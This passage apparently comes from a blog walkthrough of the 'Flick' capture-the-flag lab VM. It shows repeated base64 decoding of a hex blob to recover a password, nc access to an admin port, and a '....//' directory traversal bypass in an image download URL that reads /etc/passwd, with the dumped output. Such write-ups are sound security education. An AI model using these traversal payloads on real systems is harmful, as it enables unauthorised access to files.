\x62\x47\x45\x7a\x51\x6b\x6c\x57\x62\x58\x42\x48\x56\x44\x4a\x53\x56\x31\x5a\x75
\x55\x6d\x68\x53\x61\x7a\x56\x7a\x57\x57\x78\x6f\x62\x31\x64\x47\x57\x6e\x52\x4e
\x53\x47\x68\x50\x55\x6d\x31\x34\x56\x31\x52\x56\x61\x47\x39\x58\x52\x30\x70\x79
\x54\x6c\x5a\x73\x57\x6d\x4a\x47\x57\x6d\x68\x5a\x4d\x6e\x68\x58\x59\x7a\x46\x57
\x63\x6c\x70\x47\x61\x47\x6c\x53\x4d\x31\x46\x36\x56\x6a\x4a\x30\x55\x31\x55\x78
\x57\x6e\x4a\x4e\x57\x45\x70\x71\x55\x6d\x31\x6f\x56\x31\x52\x58\x4e\x56\x4e\x4e
\x4d\x56\x70\x78\x55\x32\x74\x30\x56\x31\x5a\x72\x63\x46\x70\x58\x61\x31\x70\x33
\x56\x6a\x46\x4b\x56\x32\x4e\x49\x62\x46\x64\x57\x52\x55\x70\x6f\x56\x6b\x52\x4b
\x54\x32\x52\x47\x53\x6e\x4a\x61\x52\x6d\x68\x70\x56\x6a\x4e\x6f\x56\x56\x64\x57
\x55\x6b\x39\x52\x4d\x57\x52\x48\x56\x32\x35\x53\x54\x6c\x5a\x46\x53\x6c\x68\x55
\x56\x33\x68\x48\x54\x6c\x5a\x61\x57\x45\x35\x56\x4f\x56\x68\x53\x4d\x48\x42\x4a
\x56\x6c\x64\x34\x63\x31\x64\x74\x53\x6b\x68\x68\x52\x6c\x4a\x58\x54\x55\x5a\x77
\x56\x46\x5a\x71\x52\x6e\x64\x53\x4d\x56\x4a\x30\x5a\x55\x64\x73\x55\x32\x4a\x59
\x59\x33\x68\x57\x61\x31\x70\x68\x56\x54\x46\x56\x65\x46\x64\x75\x53\x6b\x35\x58
\x52\x58\x42\x78\x56\x57\x78\x6b\x4e\x47\x46\x47\x56\x58\x64\x68\x52\x55\x35\x55
\x55\x6d\x78\x77\x65\x46\x55\x79\x64\x47\x46\x69\x52\x6c\x70\x7a\x56\x32\x78\x77
\x57\x47\x45\x78\x63\x44\x4e\x5a\x61\x32\x52\x47\x5a\x57\x78\x47\x63\x6d\x4a\x47
\x5a\x46\x64\x4e\x4d\x45\x70\x4a\x56\x6d\x74\x53\x53\x31\x55\x78\x57\x58\x68\x57
\x62\x6c\x5a\x57\x59\x6c\x68\x43\x56\x46\x6c\x72\x56\x6e\x64\x57\x56\x6c\x70\x30
\x5a\x55\x63\x35\x55\x6b\x31\x58\x55\x6e\x70\x57\x4d\x6a\x56\x4c\x56\x30\x64\x4b
\x53\x46\x56\x74\x4f\x56\x56\x57\x62\x48\x42\x59\x56\x47\x78\x61\x59\x56\x64\x48
\x56\x6b\x68\x6b\x52\x32\x68\x70\x55\x6c\x68\x42\x64\x31\x64\x57\x56\x6d\x39\x55
\x4d\x56\x70\x30\x55\x6d\x35\x4b\x54\x31\x5a\x73\x53\x6c\x68\x55\x56\x6c\x70\x33
\x56\x30\x5a\x72\x65\x46\x64\x72\x64\x47\x70\x69\x56\x6b\x70\x49\x56\x6c\x64\x34
\x61\x32\x46\x57\x53\x6e\x52\x50\x56\x45\x35\x58\x54\x57\x35\x6f\x57\x46\x6c\x71
\x53\x6b\x5a\x6c\x52\x6d\x52\x5a\x57\x6b\x55\x31\x56\x31\x5a\x73\x63\x46\x56\x58
\x56\x33\x52\x72\x56\x54\x46\x73\x56\x31\x56\x73\x57\x6c\x68\x69\x56\x56\x70\x7a
\x57\x57\x74\x61\x64\x32\x56\x47\x56\x58\x6c\x6b\x52\x45\x4a\x58\x54\x56\x5a\x77
\x65\x56\x59\x79\x65\x48\x64\x58\x62\x46\x70\x58\x59\x30\x68\x4b\x56\x31\x5a\x46
\x57\x6b\x78\x57\x4d\x56\x70\x48\x59\x32\x31\x4b\x52\x31\x70\x47\x5a\x45\x35\x4e
\x52\x58\x42\x4b\x56\x6d\x31\x30\x55\x31\x4d\x78\x56\x58\x68\x58\x57\x47\x68\x68
\x55\x30\x5a\x61\x56\x6c\x6c\x72\x57\x6b\x74\x6a\x52\x6c\x70\x78\x56\x47\x30\x35
\x56\x31\x5a\x73\x63\x45\x68\x58\x56\x45\x35\x76\x59\x56\x55\x78\x57\x46\x56\x75
\x63\x46\x64\x4e\x56\x32\x68\x32\x56\x31\x5a\x61\x53\x31\x49\x78\x54\x6e\x56\x52
\x62\x46\x5a\x58\x54\x54\x46\x4b\x4e\x6c\x5a\x48\x64\x47\x46\x68\x4d\x6b\x35\x7a
\x56\x32\x35\x53\x61\x31\x4a\x74\x55\x6e\x42\x57\x62\x47\x68\x44\x54\x6c\x5a\x6b
\x56\x56\x46\x74\x52\x6d\x70\x4e\x56\x31\x49\x77\x56\x54\x4a\x30\x61\x31\x64\x48
\x53\x6c\x68\x68\x52\x30\x5a\x56\x56\x6d\x78\x77\x4d\x31\x70\x58\x65\x48\x4a\x6c
\x56\x31\x5a\x49\x5a\x45\x64\x30\x55\x32\x45\x7a\x51\x58\x64\x58\x62\x46\x5a\x68
\x59\x54\x4a\x47\x56\x31\x64\x75\x53\x6d\x6c\x6c\x61\x31\x70\x59\x57\x57\x78\x6f
\x51\x31\x52\x47\x55\x6e\x4a\x58\x62\x45\x70\x73\x55\x6d\x31\x53\x65\x6c\x6c\x56
\x57\x6c\x4e\x68\x56\x6b\x70\x31\x55\x57\x78\x77\x56\x32\x4a\x59\x55\x6c\x68\x61
\x52\x45\x5a\x72\x55\x6a\x4a\x4b\x53\x56\x52\x74\x61\x46\x4e\x57\x56\x46\x5a\x61
\x56\x6c\x63\x78\x4e\x47\x51\x79\x56\x6b\x64\x57\x62\x6c\x4a\x72\x55\x6b\x56\x4b
\x62\x31\x6c\x59\x63\x45\x64\x6c\x56\x6c\x4a\x7a\x56\x6d\x35\x4f\x57\x47\x4a\x47
\x63\x46\x68\x5a\x4d\x47\x68\x4c\x56\x32\x78\x61\x57\x46\x56\x72\x5a\x47\x46\x57
\x56\x31\x4a\x51\x56\x54\x42\x6b\x52\x31\x49\x79\x52\x6b\x68\x69\x52\x6b\x35\x70
\x59\x54\x42\x77\x4d\x6c\x5a\x74\x4d\x54\x42\x56\x4d\x55\x31\x34\x56\x56\x68\x73
\x56\x56\x64\x48\x65\x46\x5a\x5a\x56\x45\x5a\x33\x59\x55\x5a\x57\x63\x56\x4e\x74
\x4f\x56\x64\x53\x62\x45\x70\x5a\x56\x47\x78\x6a\x4e\x57\x45\x79\x53\x6b\x64\x6a
\x52\x57\x68\x58\x59\x6c\x52\x42\x4d\x56\x5a\x58\x63\x33\x68\x58\x52\x6c\x5a\x7a
\x59\x55\x5a\x6b\x54\x6c\x59\x79\x61\x44\x4a\x57\x61\x6b\x4a\x72\x55\x7a\x46\x6b
\x56\x31\x5a\x75\x53\x6c\x42\x57\x62\x48\x42\x76\x57\x56\x52\x47\x64\x31\x4e\x57
\x57\x6b\x68\x6c\x52\x30\x5a\x61\x56\x6d\x31\x53\x52\x31\x52\x73\x57\x6d\x46\x56
\x52\x6c\x6c\x35\x59\x55\x5a\x6f\x57\x6c\x64\x49\x51\x6c\x68\x56\x4d\x46\x70\x68
\x59\x31\x5a\x4f\x63\x56\x56\x73\x57\x6b\x35\x57\x4d\x55\x6c\x33\x56\x6c\x52\x4b
\x4d\x47\x49\x79\x52\x6b\x64\x54\x62\x6b\x35\x55\x59\x6b\x64\x6f\x56\x6c\x5a\x73
\x57\x6e\x64\x4e\x4d\x56\x70\x79\x56\x32\x31\x47\x61\x6c\x5a\x72\x63\x44\x42\x61
\x52\x57\x51\x77\x56\x6a\x4a\x4b\x63\x6c\x4e\x72\x61\x46\x64\x53\x4d\x32\x68\x6f
\x56\x6b\x52\x4b\x52\x31\x59\x78\x54\x6e\x56\x56\x62\x45\x4a\x58\x55\x6c\x52\x57
\x57\x56\x64\x57\x55\x6b\x64\x6b\x4d\x6b\x5a\x48\x56\x32\x78\x57\x55\x32\x45\x78
\x63\x48\x4e\x56\x62\x54\x46\x54\x5a\x57\x78\x73\x56\x6c\x64\x73\x54\x6d\x68\x53
\x56\x45\x5a\x61\x56\x56\x63\x31\x62\x31\x59\x78\x57\x58\x70\x68\x53\x45\x70\x61
\x59\x57\x74\x61\x63\x6c\x56\x71\x52\x6c\x64\x6a\x4d\x6b\x5a\x47\x54\x31\x5a\x6b
\x56\x31\x5a\x47\x57\x6d\x46\x57\x62\x47\x4e\x34\x54\x6b\x64\x52\x65\x56\x5a\x72
\x5a\x46\x64\x69\x62\x45\x70\x79\x56\x57\x74\x57\x53\x32\x49\x78\x62\x46\x6c\x6a
\x52\x57\x52\x73\x56\x6d\x78\x4b\x65\x6c\x5a\x74\x4d\x44\x56\x58\x52\x30\x70\x48
\x59\x30\x5a\x6f\x57\x6b\x31\x48\x61\x45\x78\x57\x4d\x6e\x68\x68\x56\x30\x5a\x57
\x63\x6c\x70\x48\x52\x6c\x64\x4e\x4d\x6d\x68\x4a\x56\x31\x52\x4a\x65\x46\x4d\x78
\x53\x58\x68\x6a\x52\x57\x52\x68\x55\x6d\x73\x31\x57\x46\x59\x77\x56\x6b\x74\x4e
\x62\x46\x70\x30\x59\x30\x56\x6b\x57\x6c\x59\x77\x56\x6a\x52\x57\x62\x47\x68\x76
\x56\x30\x5a\x6b\x53\x47\x46\x47\x57\x6c\x70\x69\x57\x47\x68\x6f\x56\x6d\x31\x34
\x63\x32\x4e\x73\x5a\x48\x4a\x6b\x52\x33\x42\x54\x59\x6b\x5a\x77\x4e\x46\x5a\x58
\x4d\x54\x42\x4e\x52\x6c\x6c\x34\x56\x32\x35\x4f\x61\x6c\x4a\x58\x61\x46\x68\x57
\x61\x6b\x35\x54\x56\x45\x5a\x73\x56\x56\x46\x59\x61\x46\x4e\x57\x61\x33\x42\x36
\x56\x6b\x64\x34\x59\x56\x55\x79\x53\x6b\x5a\x58\x57\x48\x42\x58\x56\x6c\x5a\x77
\x52\x31\x51\x78\x57\x6b\x4e\x56\x62\x45\x4a\x56\x54\x55\x51\x77\x50\x51\x3d\x3d</p>

<p> .o88o. oooo   o8o            oooo
 888 <code>"</code>888   <code>"'           </code>888
o888oo   888  oooo   .ooooo.   888  oooo
 888     888  <code>888  d88'</code>&ldquo;Y8  888 .8P&#8217;
 888     888   888  888        888888.
 888     888   888  888   .o8  888 <code>88b.
o888o   o888o o888o</code>Y8bod8P&#8217; o888o o888o</p>

<p><a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#x3a;&#x62;&#108;&#97;&#x68;&#x40;&#x31;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x30;&#46;&#x31;&#48;&#x36;">&#x62;&#x6c;&#x61;&#104;&#x40;&#49;&#57;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#48;&#46;&#49;&#x30;&#54;</a>&rsquo;s password: [/plain]</p>

<p>OK, that&rsquo;s something - I&rsquo;m intrigued to see what the hex decodes to</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# echo -e &ldquo;\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34</p>

<blockquote><p>\x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74
\x65\x46\x5a\x56\x4d\x6a\x41\x31\x56\x6a\x41\x78\x56\x32\x4a\x45\x54\x6c\x68\x68
\x4d\x6b\x30\x78\x56\x6d\x70\x4b\x53\x31\x49\x79\x53\x6b\x56\x55\x62\x47\x68\x6f
\x54\x56\x68\x43\x55\x56\x5a\x74\x65\x46\x5a\x6c\x52\x6c\x6c\x35\x56\x47\x74\x73
\x61\x6c\x4a\x74\x61\x47\x39\x55\x56\x6d\x68\x44\x56\x56\x5a\x61\x63\x56\x46\x74</p></blockquote>

<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong> SNIP </strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>

<blockquote><p>\x56\x30\x5a\x6b\x53\x47\x46\x47\x57\x6c\x70\x69\x57\x47\x68\x6f\x56\x6d\x31\x34
\x63\x32\x4e\x73\x5a\x48\x4a\x6b\x52\x33\x42\x54\x59\x6b\x5a\x77\x4e\x46\x5a\x58
\x4d\x54\x42\x4e\x52\x6c\x6c\x34\x56\x32\x35\x4f\x61\x6c\x4a\x58\x61\x46\x68\x57
\x61\x6b\x35\x54\x56\x45\x5a\x73\x56\x56\x46\x59\x61\x46\x4e\x57\x61\x33\x42\x36
\x56\x6b\x64\x34\x59\x56\x55\x79\x53\x6b\x5a\x58\x57\x48\x42\x58\x56\x6c\x5a\x77
\x52\x31\x51\x78\x57\x6b\x4e\x56\x62\x45\x4a\x56\x54\x55\x51\x77\x50\x51\x3d\x3d&#8221;
Vm0wd2QyUXlVWGxWV0d4
V1YwZDRWMVl3WkRSWFJt
eFZVMjA1VjAxV2JETlhh
Mk0xVmpKS1IySkVUbGho
TVhCUVZteFZlRll5VGts
alJtaG9UVmhDVVZacVFt
RlpWMDE1VTJ0V1ZXSkhh</p></blockquote>

<p><strong><strong><strong><em> SNIP </em></strong></strong></strong>
V0ZkSGFGWlpiWGhoVm14
c2NsZHJkR3BTYkZwNFZX
MTBNRll4V25OalJXaFhW
ak5TVEZsVVFYaFNWa3B6
Vkd4YVUySkZXWHBXVlZw
R1QxWkNVbEJVTUQwPQ==
[/plain]</p>

<p>Oooh, base64 - this has to be the password !</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# echo &ldquo;Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ==&rdquo; | base64 -d
Vm0wd2QyUXlVWGxWV0d4V1YwZDRXRmxVU205V01WbDNXa2M1VjJKR2JETlhhMXBQVmxVeFYyTkljRmhoTVhCUVZqQmFZV015U2tWVWJHaG9UVlZ3VlZadGNFZFRNazE1VTJ0V1ZXSkhhRzlVVjNOM1pVWmFkR05GWkZwV01ERTFWVEowVjFaWFNraGhSemxWVm14YU0xWnNXbUZrUjA1R1drWlNUbUpGY0VwV2JURXdZekpHVjFOdVVtaFNlbXhXVm1wT1QwMHhjRlpYYlVaclVqQTFSMVV5TVRSVk1rcFhVMnR3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMHhORmxWTUhoWGJrNVlZbFZhY2xWc1VrZFhiR3QzV2tSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOdFJrZFhiV3hUWVROQ1dGWnRNVEJXTWxGNVZXNU9XR0pIVWxsWmJHaFRWMFpTVjFwR1RteGlSbXcxVkZaU1UxWnJNWEpqUld4aFUwaENTRlpxU2tabFZsWlpXa1p3YkdFelFrbFdWM0JIVkRKU1YxVnVVbXBTYkVwVVZteG9RMWRzV25KWGJHUm9UVlpXTlZaWGVHdGhiRXAwWVVoT1ZtRnJOVlJXTVZwWFkxWktjbVJHVWxkaVJtOTNWMnhXYjJFeFdYZE5WVlpUWWtkU1lWUlZXbUZsYkZweFUydDBWMVpyV2xwWlZWcHJWVEZLV1ZGcmJGZFdNMEpJVmtSS1UxWXhaSFZVYkZKcFZqTm9WVlpHWTNoaU1XUnpWMWhvWVZKR1NuQlVWM1J6VGtaa2NsWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreWVHdGtSa3AwWlVaa2FWWnJiekZXYlhCTFRrWlJlRmRzYUZSaVJuQlpWbXRXZDFkR2JITmhSVTVZVW14d2VGVnRkREJoYXpGeVRsVnNXbFpXY0hKWlZXUkdaVWRPU0dGR2FHbFNia0p2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTlc5a2JGcEhWbTA1VWsxWFVsaFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaFhZWHBXU0ZacVNqUlZNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYWVRGd2FGWlVSa1psUm1SellVWlNhRTFZUW5oV1YzaHJZakZrUjFWc2FFOVdWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm05WGJGcFhZMGhLV2xaWFVrZGFWM2hIWTIxS1IxcEdaRk5XV0VKMlZtcEdZV0V4VlhoWFdHaFZZbXhhVmxscldrdGpSbFp4VW10MFYxWnNjRWhXVjNSTFlUQXhSVkpzVGxaU2JFWXpWVVpGT1ZCUlBUMD0=
root@pwk:~#[/plain]</p>

<p>More base64&hellip; OK, decode again</p>

<p>[plain gutter=&ldquo;false&rdquo;]
echo &ldquo;Vm0wd2QyUXlVWGxWV0d4V1YwZDRXRmxVU205V01WbDNXa2M1VjJKR2JETlhhMXBQVmxVeFYyTkljRmhoTVhCUVZqQmFZV015U2tWVWJHaG9UVlZ3VlZadGNFZFRNazE1VTJ0V1ZXSkhhRzlVVjNOM1pVWmFkR05GWkZwV01ERTFWVEowVjFaWFNraGhSemxWVm14YU0xWnNXbUZrUjA1R1drWlNUbUpGY0VwV2JURXdZekpHVjFOdVVtaFNlbXhXVm1wT1QwMHhjRlpYYlVaclVqQTFSMVV5TVRSVk1rcFhVMnR3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMHhORmxWTUhoWGJrNVlZbFZhY2xWc1VrZFhiR3QzV2tSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOdFJrZFhiV3hUWVROQ1dGWnRNVEJXTWxGNVZXNU9XR0pIVWxsWmJHaFRWMFpTVjFwR1RteGlSbXcxVkZaU1UxWnJNWEpqUld4aFUwaENTRlpxU2tabFZsWlpXa1p3YkdFelFrbFdWM0JIVkRKU1YxVnVVbXBTYkVwVVZteG9RMWRzV25KWGJHUm9UVlpXTlZaWGVHdGhiRXAwWVVoT1ZtRnJOVlJXTVZwWFkxWktjbVJHVWxkaVJtOTNWMnhXYjJFeFdYZE5WVlpUWWtkU1lWUlZXbUZsYkZweFUydDBWMVpyV2xwWlZWcHJWVEZLV1ZGcmJGZFdNMEpJVmtSS1UxWXhaSFZVYkZKcFZqTm9WVlpHWTNoaU1XUnpWMWhvWVZKR1NuQlVWM1J6VGtaa2NsWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreWVHdGtSa3AwWlVaa2FWWnJiekZXYlhCTFRrWlJlRmRzYUZSaVJuQlpWbXRXZDFkR2JITmhSVTVZVW14d2VGVnRkREJoYXpGeVRsVnNXbFpXY0hKWlZXUkdaVWRPU0dGR2FHbFNia0p2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTlc5a2JGcEhWbTA1VWsxWFVsaFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaFhZWHBXU0ZacVNqUlZNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYWVRGd2FGWlVSa1psUm1SellVWlNhRTFZUW5oV1YzaHJZakZrUjFWc2FFOVdWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm05WGJGcFhZMGhLV2xaWFVrZGFWM2hIWTIxS1IxcEdaRk5XV0VKMlZtcEdZV0V4VlhoWFdHaFZZbXhhVmxscldrdGpSbFp4VW10MFYxWnNjRWhXVjNSTFlUQXhSVkpzVGxaU2JFWXpWVVpGT1ZCUlBUMD0=&rdquo; | base64 -d
Vm0wd2QyUXlVWGxWV0d4WFlUSm9WMVl3Wkc5V2JGbDNXa1pPVlUxV2NIcFhhMXBQVjBaYWMySkVUbGhoTVVwVVZtcEdTMk15U2tWVWJHaG9UV3N3ZUZadGNFZFpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmJFcEpWbTEwYzJGV1NuUmhSemxWVmpOT00xcFZXbUZrUjA1R1UyMTRVMkpXU2twV2JURXdZekpHVjFOdVVtaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVsUkdXbGt3WkRSVk1rcFhVMnR3VjJKVVJYZFpWRVpyVTBaT2NtRkdXbWxTYTNCWFZtMTBWMlF5VW5OWGJHUllZbGhTV0ZSV1pGTmxiRmw1VFZSU1ZrMXJjRWxhU0hCSFZqSkZlVlZZWkZwbGEzQklWV3BHVDJSV1VuUmpSbEpUVmxoQ1dsWnJXbGRoTVZWNVZXeGthbEp0YUhOVmFrNVRWMVpXY1ZKcmRGUldiRm93V2xWb2ExWXdNVVZTYkdSYVRVWmFlbFpxU2t0V1ZrWlpZVVprVTFKWVFrbFdWM0JIVkRKU1YxZHVUbFJpVjNoVVZGY3hiMWRzV1hoYVJGSnBUV3RzTkZkclZtdFdiVXB5WTBac1dtSkdXbWhaTVZwelkyeGtkRkp0ZUZkaVZrbzFWbXBLTkZReFdsaFRiRnBZVmtWd1dGbHNhRU5YUmxweFVtdDBhazFyTlVsWlZWcHJZVWRGZUdOSGFGaGlSbkJvVmtSS1QyTXlUa1phUjJoVFRXNW9kbFpHVm05Uk1XUlhWMWhvV0dKWVVrOVZha1pIVGxaYVdFNVZPV2hXYXpWSFZqSjRVMWR0U2toaFJsSlhUVVp3VkZacVJtdGtWbkJHVGxaT2FWSnRPVE5XYTFwaFZURkZlRmRzYUZSaE1YQnhWV3hrYjFkR1VsaE9WVTVZVW14d2VGVnRkREJoYXpGeVRsVm9XbFpXY0hKWlZXUkdaV3hHY21KR1pGZFNWWEJ2VmpGYWExVXhXWGhVYmxaVllrWktjRlZxUmt0V1ZscEhWV3RLYTAxRVJsTlZSbEYzVUZFOVBRPT0=
root@pwk:~#[/plain]</p>

<p><img src="http://d2tq98mqfjyz2l.cloudfront.net/image_cache/1308021750174814.gif" alt="" /> Turns out you have to keep decoding the base64 about 13 more times until you end up with this</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# echo &ldquo;dGFidXBKaWV2YXM4S25vag==&rdquo; | base64 -d
tabupJievas8Knoj
root@pwk:~#[/plain]</p>

<p>Which just so happens to be the password for the application runnning on port 8881</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# nc 192.168.0.106 8881
Welcome to the admin server. A correct password will &lsquo;flick&rsquo; the switch and open a new door:</p>

<blockquote><p>tabupJievas8Knoj
OK: tabupJievas8Knoj</p></blockquote>

<p>Accepted! The door should be open now :poolparty:</p>

<blockquote><p>[/plain]</p></blockquote>

<p>Another NMAP scan now indicates that port 80 is open. Let us take a look.</p>

<hr />

<h2>The Internet is Made of Cats</h2>

<p>Looking at the site hosted by the website kinda stops me in my tracks. KITTENS !!! YAY !!!</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_001.png" alt="flick_001" /></a></p>

<p>You can log in with the credentials of demo:demo123 on the login page to give you the ability to upload images (note here, it allows you to upload absolutely anything).</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_002.png" alt="flick_002" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_003.png" alt="flick_003" /></a></p>

<p>I figured that the upload feature was the vulnerability and worked on uploading PHP shells etc, but I was not able to get any PHP to execute. Maybe it&rsquo;s not the <strong>up</strong>load feature that&rsquo;s useful, maybe it&rsquo;s the <strong>down</strong>load feature ? The download feature will present you with a file, called image.jpg, of the file you&rsquo;re requesting. Turns out you can request any file on the filesystem if you bypass the directory traversal filter (same way as with Hell, using &hellip;.// instead of ../). Requesting the following</p>

<p>[plain gutter=&ldquo;false&rdquo;]
<a href="http://192.168.0.106/image/download?filename=....//....//....//....//....//etc/passwd">http://192.168.0.106/image/download?filename=&#8230;.//&#8230;.//&#8230;.//&#8230;.//&#8230;.//etc/passwd</a>[/plain]</p>

<p>results in an &ldquo;image.jpg&rdquo; file which needs to be catted to view the contents of /etc/passwd as text.</p>

<p>[plain]
root@pwk:~# mv image.jpg flick_passwd
root@pwk:~# cat flick_passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
<a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh</a>
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
whoopsie:x:103:106::/nonexistent:/bin/false
landscape:x:104:109::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
robin:x:1000:1000:robin,,,:/home/robin:/bin/bash
mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
dean:x:1001:1001:,,,:/home/dean:/bin/bash
root@pwk:~#
[/plain]</p>

<p>Hmm, with this I can request pretty much anything, right ? If a folder or file exists, it gives me a download dialog, if the file does not exist, it gives me an error. This is blind filesystem traversal.</p>

